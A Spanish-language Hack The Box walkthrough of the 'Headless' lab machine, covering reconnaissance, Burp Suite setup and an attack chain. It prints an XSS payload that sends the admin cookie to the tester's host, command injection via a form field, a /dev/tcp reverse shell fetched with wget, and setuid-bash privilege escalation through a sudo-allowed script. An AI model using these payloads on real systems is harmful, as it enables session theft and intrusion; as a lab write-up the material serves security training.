#MÁQUINA HEADLESS

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/9f252485-3b0e-4e77-9f7b-cd3f3ec93386)

En primera instancia, procedemos a conectarnos a la VPN

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/498cb47d-d1a2-4b5b-89db-fa41153793f6)

Una vez conectados, procedemos a hacer el Nmap a la ip de la maquina (10.10.11.8)

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/62f3c5df-2a57-4f87-a10d-0b547fb749d9)

Como podemos apreciar, tenemos dos puertos abiertos, el puerto 5000/tcp indica que el puerto 5000 está abierto y está utilizando el protocolo TCP (Transmission Control Protocol). En este caso, también se especifica que el servicio que está utilizando este puerto es "upnp". UPnP (Universal Plug and Play) es un conjunto de protocolos de red que permite a dispositivos en una red comunicarse entre sí sin necesidad de configuración manual por parte del usuario o un administrador de red.

En este caso vamos a tratar de entrar a este puerto. 

Si nos vamos al navegador y ponemos la ip de la maquina junto con el puerto (10.10.11.8:5000) podremos apreciar lo siguiente

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/131640d5-e21b-422b-b9bb-9ae8b848d582)

Si presionamos el botón “For questions” podremos apreciar lo siguiente: 

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/6f9f8931-4dae-4966-82b6-c04a6272a059)

Si en Message, podemos un código, en este caso la etiqueta script para causar error a propósito (Pues no está finalizado el cierre), podremos apreciar lo siguiente

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/443744f1-606c-4931-acbe-a08a86c5bb22)

Donde podremos ver el cookie del administrador, pero esto aún no es para iniciar sesión como este. 

Podremos ver el mismo valor si inspeccionamos la página y ns dirigimos a "Storage":

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/9de3e621-dd0e-435f-ab09-f2787352ab93)

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/91a41c5c-9476-4be6-9120-82ff7ff37d30)

#CONFIGURACIÓN BURP SUITE

En primera instancia procedemos a configurar nuestro Burp Suite, agregando un proxy con la ip y puerto '127.0.0.1:8080'

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/606f6dbd-1b2a-41b8-9786-67c7443584b8)

Y luego procedemos a instalar la extensión 'FoxyProxy' para poder escuchar y hacer peticiones a la página que se mostró en un principió.

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/18908790-ead9-4e02-8ed2-04249bb878b7)


![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/cc9280e4-f67a-46ab-9bef-ddfcbd4897a6)

Una vez instalada procedemos a irnos a opciones: 

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/8affec6d-3e87-4d2b-a0fa-d5e8ffcf95e7)

Y luego a 'Proxies' con la misma ip y puerto que tenemos en el Burp Suite

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/f1cefa7d-186a-4e3a-9a1e-7d8835f4b12c)

Nos tendrá que aparecer algo así:


![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/c4b9f52f-e147-4663-a9e3-6165aaad5c09)

Seleccionamos el que hemos creado y seleccionamos el botón Submmit para luego dirigirnos al apartado de Proxy en Burp. La petición se verá así:

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/06489428-6891-4491-ba17-66e0bd97dc4e)

Le damos clic derecho y lo enviamos al 'Repeater' para realizar las peticiones:


![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/ca86451e-9974-4fbd-b53e-4fac23608f56)


![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/8bbb56fb-4598-4f91-8041-57e67bd18334)

#INICIO HACKEO

Primero procedemos a conocer la ip de nuestra máquina virtual:

```
ip a
```

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/8c0c0378-3daa-4269-a827-0f90a27580ab)

Lugo pondremos a escuchar un puerto, en este caso es: 1234

```
python3 -m http.server 1234
```

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/1e55d1d6-da06-4c4d-bb7c-8d7d3ad59eac)

Para luego enviar la siguiente solicitud en el campo 'message' con la ip de la máquina y el puerto que pusimos a escuchar para obtener el cookie de la página para acceder como administrador

```
<img src=x onerror=fetch('http://10.10.14.28:1234/'+document.cookie);>
```

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/805d6cc8-efff-4827-a678-b99bc9ad734f)

Luego de enviarla veremos que se obtuvo lo siguiente 

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/13111897-cc7f-4468-b1ce-b0a86bcc7abd)

Donde podemos observar el valor de la llave del administrador

Luego, nos vamos a inspeccionar de nuevo la pagina web y nos vamos a 'Storage para reemmplazar el valor de la cookie del administradir por el nuevo que nos trajo cuando se escuchó el puerto:

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/c0518daf-fcbe-44e9-811f-5a16b36c8157)

Recargamos y como podemos ver tenemos acceso al panel del administrador

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/3d9f991f-97db-4dcd-8c24-af91e57568d9)

Y al presionar el botón 'Generate Report' podremos ver la petición en el Burp Suite, donde la enviaremos al 'Repeater'

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/70c9c307-27f9-4a36-a987-dc4a061517e8)

Una vez alli probamos con el comando ls para investigar que hay

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/62438378-1563-413b-8112-b706ef297575)

Donde podemos observar los archivos que componen la web. Nuestro objetivo será entrar a la máquina para obtener las banderas, por lo que desde aquí todavia no tenemos acceso a ella. 

Procedemos a preguntar cual es el usuario actual con el siguiente comando

```
whoami
```

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/69fdf2aa-2be7-4c2e-b79d-1f28dd94825f)

Donde podremos observar que no es el usuario root, y por lo tanto podemos deducir que es al primero al que atacaremos para obtener la bandera

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/58b7af12-4754-4e83-9498-5ef6641b700d)

Una vez realizado el paso anterior, procedemos a escuchar el puerto 3333 en mi caso que a donde voy a realizar la solicitud. 

```
python3 -m http.server 3333
```

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/c97788fb-7232-4ab2-b86b-d86dfe573949)

Luego procedemos a crear un archivo de script (payload.sh en este caso) que contiene un comando de shell inversa. Este comando intenta establecer una conexión de shell inversa a la dirección IP 10.10.14.28 en el puerto 9090.

```
echo "sh -i > & /dev/tcp/10.10.14.28/9090 0>&1" | tee -a payload.sh
```

También le otorgamos permisos de ejecución al archivo

```
chmod +x payload.sh
```

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/7ed3a828-f13e-416c-8b86-53c98df9103e)


Una vez puesto el puerto a escuchar procedemos a realizar la siguiente solicitud en la página para verificar de que si se esta trayendo la información 

```
wget http://10.10.14.28:3333/payload.sh
```

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/f2c103a8-a713-49f4-8cfb-a51c14da7a61)

Y una vez relizada la petición procedemos a mirar la terminal

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/6229ac2b-eaa4-47a5-a459-e3652a130019)

Además de eso procedemos a crear un servidor de escucha para el puerto 9090, que fue al que añadimos al payload 

```
nc -lvnp 9090
```

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/2c95f891-ff1e-4107-b4c9-0ec3c8ac8acc)

Y en el Burp Suite procedemos a enviarle por medio del campo date lo siguiente 

```
bash payload.sh
```

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/66a4b439-0276-4f83-babe-8891a672ffca)

Y una vez realizada la solicitud, volvemos a la terminal para ver que ya se tiene acceso

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/1e149ec7-549a-4e9f-a68a-dc79f9616922)

Procedemos a preguntar quienes somos y en que directorio estamos ubicados, para luego listar y ver lo que se tiene 

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/a0781191-ff1f-42ca-8f31-f9d5aed300e2)

Procedemos a leer el archivo 'initdb.sh' que es el contiene la configuración de la db

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/77bd4eb4-35f7-4b2a-ba3b-e4a36df1a06b)

Donde: 

- 'chmod +x /bin/bash' otorga permisos de ejecución al archivo /bin/bash, que es el intérprete de comandos Bash. Con este permiso, cualquier usuario puede ejecutar el archivo /bin/bash como un programa.

- 'chmod u+s /bin/bash' establece el bit setuid en el archivo /bin/bash. Cuando un archivo tiene el bit setuid activado, se ejecuta con los privilegios del propietario del archivo, en lugar de los privilegios del usuario que lo está ejecutando.

Como no sabemos si el bit seuid esta activado procedemos a eliminar la carpeta y a ejecutar el siguiente comando para la lista de permisos de sudo (superusuario) que tiene el usuario actual

```
sudo -l
```

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/9a47475d-0253-43bb-98be-fc9d00183e57)

Donde no indica que el usuario dvir tiene permiso para ejecutar el comando /usr/bin/syscheck en el sistema headless sin necesidad de ingresar su contraseña. Para saber que contiene el directiorio procedemos a leerlo 

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/464b291d-66b2-4871-a8f9-fa748e86b6fd)

Y este nos indica que el servicio de base de datos no se esta corriendo porque falta el archivo 'initdb.sh' el que habiamos eliminado hace un instante 

Procedemos a crearlo de nuevo y a asignarle los permisos que tenia antes. 

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/8bbb8ce8-794e-4c38-9cb2-55d05e8d35b9)

Una vez creado le damos permisos de ejecución ejecutamos el archivo syscheck como super usuario, donde nos aparecerá lo siguiente:

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/5baa7f95-5649-4861-8716-583a278525fa)

Luego esperamos unos segundos y ejecutamos el siguiente comando para iniciar un nuevo shell Bash con todas las configuraciones y variables de entorno que normalmente se cargarían al iniciar sesión en un sistema

```
/bin/bash -p 
```

Y ejecutamos el comando id para saber la identidad del usuario actual

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/2d659f74-124b-47da-9004-3bc6305b91a2)

Lo que nos dice esto, es que indica que el usuario dvir tiene permisos normales de usuario (uid=1000), su grupo principal es dvir (gid=1000), pero actualmente tiene privilegios de superusuario (euid=0). Además, pertenece al grupo users y su UID, GID y nombre de usuario y grupo coinciden.

Procedemos a entrar al directorio de home para luego listar y ver que hay otro con el nombre de usuario actual, si listamos lo que tiene, podremos ver un archivo llamado 'user.txt', y si lo leemos podremos ver la bandera del usuario 

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/5c1a123f-d876-4a47-b7cf-60b79f36be64)

y si procedemos a entarr al directorio de inicio del usuario root y listamos, podremos ver que hay un archivo llamado root.txt donde estará la bandera del usuario root 

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/b962f4cc-7a6b-4161-8df3-bd9be49d66da)

Si la ingresamos a hack the box podremos ver que efectivamente son las banderas que se debian encontrar 

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/0f8763b7-ba97-470b-b559-5c8f18a0fabe)

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/e2a15589-94d3-4aed-bbf9-2b13006f1c5d)

![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/7b6ffab7-2dc8-417d-ae72-813f7081ccd7)




